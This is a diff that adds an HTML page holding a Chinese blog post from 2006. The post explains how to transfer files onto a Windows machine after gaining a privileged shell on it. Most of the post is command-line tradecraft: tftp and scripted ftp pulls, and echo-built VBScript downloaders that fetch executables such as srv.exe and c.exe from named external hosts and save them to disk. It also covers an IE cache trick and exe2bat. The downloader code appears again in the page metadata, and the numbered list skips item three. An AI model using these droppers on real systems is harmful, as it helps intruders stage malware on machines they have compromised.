@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>八种文件上传大法 | 白天’s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
+格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
+二：ftp下载文件
+ftp下载文件一般步骤如下：
+echo open xxx.xxx.xxx.xxx &gt;ftp.txt
+echo user &raquo;ftp.txt
+echo password &raquo;ftp.txt
+echo binary &raquo;ftp.txt [可选]
+echo get srv.exe &raquo;ftp.txt
+echo bye &raquo;ftp.txt
+ftp -s:ftp.txt(这一步是关键哟)
+del ftp.txt
+这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
+四：写程序下载
+脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
+echo Set xPost = CreateObject(&ldquo;Microsoft.XMLHTTP&rdquo;) &gt;webdown.vbs
+echo xPost.Open &ldquo;GET&rdquo;,&ldquo;http://txhak.126.com/srv.exe&quot;,0 &raquo;webdown.vbs
+echo xPost.Send() &raquo;webdown.vbs
+echo Set sGet = CreateObject(&ldquo;ADODB.Stream&rdquo;) &raquo;webdown.vbs
+echo sGet.Mode = 3 &raquo;webdown.vbs
+echo sGet.Type = 1 &raquo;webdown.vbs
+echo sGet.Open() &raquo;webdown.">
+<meta name="author" content="admin">
+<link rel="canonical" href="http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://example.org/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://example.org/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://example.org/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://example.org/apple-touch-icon.png">
+<link rel="mask-icon" href="http://example.org/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="八种文件上传大法" />
+<meta property="og:description" content="八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
+格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
+二：ftp下载文件
+ftp下载文件一般步骤如下：
+echo open xxx.xxx.xxx.xxx &gt;ftp.txt
+echo user &raquo;ftp.txt
+echo password &raquo;ftp.txt
+echo binary &raquo;ftp.txt [可选]
+echo get srv.exe &raquo;ftp.txt
+echo bye &raquo;ftp.txt
+ftp -s:ftp.txt(这一步是关键哟)
+del ftp.txt
+这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
+四：写程序下载
+脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
+echo Set xPost = CreateObject(&ldquo;Microsoft.XMLHTTP&rdquo;) &gt;webdown.vbs
+echo xPost.Open &ldquo;GET&rdquo;,&ldquo;http://txhak.126.com/srv.exe&quot;,0 &raquo;webdown.vbs
+echo xPost.Send() &raquo;webdown.vbs
+echo Set sGet = CreateObject(&ldquo;ADODB.Stream&rdquo;) &raquo;webdown.vbs
+echo sGet.Mode = 3 &raquo;webdown.vbs
+echo sGet.Type = 1 &raquo;webdown.vbs
+echo sGet.Open() &raquo;webdown." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2006-02-25T16:03:17+00:00" />
+<meta property="article:modified_time" content="2006-02-25T16:03:17+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="八种文件上传大法"/>
+<meta name="twitter:description" content="八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
+格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
+二：ftp下载文件
+ftp下载文件一般步骤如下：
+echo open xxx.xxx.xxx.xxx &gt;ftp.txt
+echo user &raquo;ftp.txt
+echo password &raquo;ftp.txt
+echo binary &raquo;ftp.txt [可选]
+echo get srv.exe &raquo;ftp.txt
+echo bye &raquo;ftp.txt
+ftp -s:ftp.txt(这一步是关键哟)
+del ftp.txt
+这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
+四：写程序下载
+脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
+echo Set xPost = CreateObject(&ldquo;Microsoft.XMLHTTP&rdquo;) &gt;webdown.vbs
+echo xPost.Open &ldquo;GET&rdquo;,&ldquo;http://txhak.126.com/srv.exe&quot;,0 &raquo;webdown.vbs
+echo xPost.Send() &raquo;webdown.vbs
+echo Set sGet = CreateObject(&ldquo;ADODB.Stream&rdquo;) &raquo;webdown.vbs
+echo sGet.Mode = 3 &raquo;webdown.vbs
+echo sGet.Type = 1 &raquo;webdown.vbs
+echo sGet.Open() &raquo;webdown."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://example.org/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "八种文件上传大法",
+      "item": "http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "八种文件上传大法",
+  "name": "八种文件上传大法",
+  "description": "八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP\n格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。\n二：ftp下载文件\nftp下载文件一般步骤如下：\necho open xxx.xxx.xxx.xxx \u0026gt;ftp.txt\necho user \u0026raquo;ftp.txt\necho password \u0026raquo;ftp.txt\necho binary \u0026raquo;ftp.txt [可选]\necho get srv.exe \u0026raquo;ftp.txt\necho bye \u0026raquo;ftp.txt\nftp -s:ftp.txt(这一步是关键哟)\ndel ftp.txt\n这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。\n四：写程序下载\n脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:\necho Set xPost = CreateObject(\u0026ldquo;Microsoft.XMLHTTP\u0026rdquo;) \u0026gt;webdown.vbs\necho xPost.Open \u0026ldquo;GET\u0026rdquo;,\u0026ldquo;http://txhak.126.com/srv.exe\u0026quot;,0 \u0026raquo;webdown.vbs\necho xPost.Send() \u0026raquo;webdown.vbs\necho Set sGet = CreateObject(\u0026ldquo;ADODB.Stream\u0026rdquo;) \u0026raquo;webdown.vbs\necho sGet.Mode = 3 \u0026raquo;webdown.vbs\necho sGet.Type = 1 \u0026raquo;webdown.vbs\necho sGet.Open() \u0026raquo;webdown.",
+  "keywords": [
+    
+  ],
+  "articleBody": "八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP\n格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。\n二：ftp下载文件\nftp下载文件一般步骤如下：\necho open xxx.xxx.xxx.xxx \u003eftp.txt\necho user »ftp.txt\necho password »ftp.txt\necho binary »ftp.txt [可选]\necho get srv.exe »ftp.txt\necho bye »ftp.txt\nftp -s:ftp.txt(这一步是关键哟)\ndel ftp.txt\n这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。\n四：写程序下载\n脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:\necho Set xPost = CreateObject(“Microsoft.XMLHTTP”) \u003ewebdown.vbs\necho xPost.Open “GET”,“http://txhak.126.com/srv.exe\",0 »webdown.vbs\necho xPost.Send() »webdown.vbs\necho Set sGet = CreateObject(“ADODB.Stream”) »webdown.vbs\necho sGet.Mode = 3 »webdown.vbs\necho sGet.Type = 1 »webdown.vbs\necho sGet.Open() »webdown.vbs\necho sGet.Write(xPost.responseBody) »webdown.vbs\necho sGet.SaveToFile “srv.exe”,2 »webdown.vbs\n然后执行cscript webdown.vbs就可以啦。其中，http://txhak.126.com/srv.exe改成你放文件的网站路径，srv.exe可以改成保存文件的路径。 这里ADODB.Stream很重要如果目标机隔离了adodb.stream就会不成功。\n五：START ITS:HTTP://IP/文件名\n然后cd “C:\\Documents and Settings\\Default User\\Local Settings\\Temporary Internet Files\\Content.IE5\"\n然后DIR 文件名\n注意：那串长文件名要用\"“引起来，因为有空格\n例子：C:\\Documents and Settings\\Administrator\u003estart its:http://xxx.xxx.xxx.xxx/srv.\nC:\\Documents and Settings\\Administrator\\Local Settings\\Temporary Internet Files\\Content.IE5\\0AB3MNO1 的目录\n2003-11-22 17:48 12,832 srv.exe\n1 个文件 12,832 字节\n列出所有文件:\n1 个文件 12,832 字节\n0 个目录 6,425,985,024 可用字节\nC:\\Documents and Settings\\Administrator\u003ecopy C:\\Documents and Settings\\Administrator\\Local Settings\\Temporary Internet Files\\Content.IE5\\0AB3MNO1\\srv.exe c:\\srv.exe\n已复制 1 个文件\n六。一句话下载。第4种方法的精简，有时很有用的 echo Set xPost = CreateObject(^“Microsoft.XMLHTTP^”):xPost.Open ^“GET^”,^“http://soft.163vv.com/77169/c.exe^\",0:xPost.Send():Set sGet = CreateObject(^“ADODB.Stream^”):sGet.Mode = 3:sGet.Type = 1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^“c:\\c.exe^\",2 \u003epig.vbs\n七。写程序下载\niLocal = LCase(WScript.Arguments(1)) \u003ec:\\down.vbs iRemote = LCase(WScript.Arguments(0)) »c:\\down.vbs Set xPost = CreateObject(“Microsoft.XMLHTTP”) »c:\\down.vbs xPost.Open “GET”,iRemote,0 »c:\\down.vbs xPost.Send() »c:\\down.vbs Set sGet = CreateObject(“ADODB.Stream”) »c:\\down.vbs sGet.Mode = 3 »c:\\down.vbs sGet.Type = 1 »c:\\down.vbs sGet.Open() »c:\\down.vbs sGet.Write(xPost.responseBody) »c:\\down.vbs sGet.SaveToFile iLocal,2 »c:\\down.vbs\n原理同四，另一种用法 down.vbs http://www.xxx.com/abc.exe abc.exe\n八.exe2bat命令行下输入，debug还原成文件\n用exe2bat这个工具把exe文件转化成bat，然后一行行敲进去，这样工作量非常大，只适合于非常短小的文件。\n",
+  "wordCount" : "196",
+  "inLanguage": "en",
+  "datePublished": "2006-02-25T16:03:17Z",
+  "dateModified": "2006-02-25T16:03:17Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "白天’s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://example.org/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://example.org/" accesskey="h" title="白天’s Blog (Alt + H)">白天’s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      八种文件上传大法
+    </h1>
+    <div class="post-meta"><span title='2006-02-25 16:03:17 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><p>八种文件上传大法
+本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法.
+　　一，TFTP</p>
+<p>格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。</p>
+<p>二：ftp下载文件</p>
+<p>　　ftp下载文件一般步骤如下：</p>
+<p>　　echo open xxx.xxx.xxx.xxx &gt;ftp.txt</p>
+<p>　　echo user &raquo;ftp.txt</p>
+<p>　　echo password &raquo;ftp.txt</p>
+<p>　　echo binary &raquo;ftp.txt [可选]</p>
+<p>　　echo get srv.exe &raquo;ftp.txt</p>
+<p>　　echo bye &raquo;ftp.txt</p>
+<p>　　ftp -s:ftp.txt(这一步是关键哟)</p>
+<p>　　del ftp.txt</p>
+<p>　　这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。</p>
+<p>四：写程序下载</p>
+<p>　　脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:</p>
+<p>　　echo Set xPost = CreateObject(&ldquo;Microsoft.XMLHTTP&rdquo;) &gt;webdown.vbs</p>
+<p>　　echo xPost.Open &ldquo;GET&rdquo;,&ldquo;<a href="http://txhak.126.com/srv.exe%22,0">http://txhak.126.com/srv.exe&quot;,0</a> &raquo;webdown.vbs</p>
+<p>　　echo xPost.Send() &raquo;webdown.vbs</p>
+<p>　　echo Set sGet = CreateObject(&ldquo;ADODB.Stream&rdquo;) &raquo;webdown.vbs</p>
+<p>　　echo sGet.Mode = 3 &raquo;webdown.vbs</p>
+<p>　　echo sGet.Type = 1 &raquo;webdown.vbs</p>
+<p>　　echo sGet.Open() &raquo;webdown.vbs</p>
+<p>　　echo sGet.Write(xPost.responseBody) &raquo;webdown.vbs</p>
+<p>　　echo sGet.SaveToFile &ldquo;srv.exe&rdquo;,2 &raquo;webdown.vbs</p>
+<p>　　然后执行cscript webdown.vbs就可以啦。其中，http://txhak.126.com/srv.exe改成你放文件的网站路径，srv.exe可以改成保存文件的路径。 这里ADODB.Stream很重要如果目标机隔离了adodb.stream就会不成功。</p>
+<p>五：START ITS:HTTP://IP/文件名</p>
+<p>　　然后cd &ldquo;C:\Documents and Settings\Default User\Local Settings\Temporary Internet Files\Content.IE5&quot;</p>
+<p>　　然后DIR 文件名</p>
+<p>　　注意：那串长文件名要用&quot;&ldquo;引起来，因为有空格</p>
+<p>　　例子：C:\Documents and Settings\Administrator&gt;start its:http://xxx.xxx.xxx.xxx/srv.</p>
+<p>　　C:\Documents and Settings\Administrator\Local Settings\Temporary Internet Files\Content.IE5\0AB3MNO1 的目录</p>
+<p>　　2003-11-22 17:48 12,832 srv.exe</p>
+<p>　　1 个文件 12,832 字节</p>
+<p>　　列出所有文件:</p>
+<p>　　1 个文件 12,832 字节</p>
+<p>　　0 个目录 6,425,985,024 可用字节</p>
+<p>　　C:\Documents and Settings\Administrator&gt;copy C:\Documents and Settings\Administrator\Local Settings\Temporary Internet Files\Content.IE5\0AB3MNO1\srv.exe c:\srv.exe</p>
+<p>　　已复制 1 个文件</p>
+<p>六。一句话下载。第4种方法的精简，有时很有用的
+echo Set xPost = CreateObject(^&ldquo;Microsoft.XMLHTTP^&rdquo;):xPost.Open ^&ldquo;GET^&rdquo;,^&ldquo;<a href="http://soft.163vv.com/77169/c.exe%5E%22,0:xPost.Send():Set">http://soft.163vv.com/77169/c.exe^&quot;,0:xPost.Send():Set</a> sGet = CreateObject(^&ldquo;ADODB.Stream^&rdquo;):sGet.Mode = 3:sGet.Type = 1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^&ldquo;c:\c.exe^&quot;,2 &gt;pig.vbs</p>
+<p>七。写程序下载</p>
+<p>iLocal = LCase(WScript.Arguments(1)) &gt;c:\down.vbs
+iRemote = LCase(WScript.Arguments(0)) &raquo;c:\down.vbs
+Set xPost = CreateObject(&ldquo;Microsoft.XMLHTTP&rdquo;) &raquo;c:\down.vbs
+xPost.Open &ldquo;GET&rdquo;,iRemote,0 &raquo;c:\down.vbs
+xPost.Send() &raquo;c:\down.vbs
+Set sGet = CreateObject(&ldquo;ADODB.Stream&rdquo;) &raquo;c:\down.vbs
+sGet.Mode = 3 &raquo;c:\down.vbs
+sGet.Type = 1 &raquo;c:\down.vbs
+sGet.Open() &raquo;c:\down.vbs
+sGet.Write(xPost.responseBody) &raquo;c:\down.vbs
+sGet.SaveToFile iLocal,2 &raquo;c:\down.vbs</p>
+<p>原理同四，另一种用法 down.vbs <a href="http://www.xxx.com/abc.exe">http://www.xxx.com/abc.exe</a> abc.exe</p>
+<p>八.exe2bat命令行下输入，debug还原成文件</p>
+<p>用exe2bat这个工具把exe文件转化成bat，然后一行行敲进去，这样工作量非常大，只适合于非常短小的文件。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="http://example.org/">白天’s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
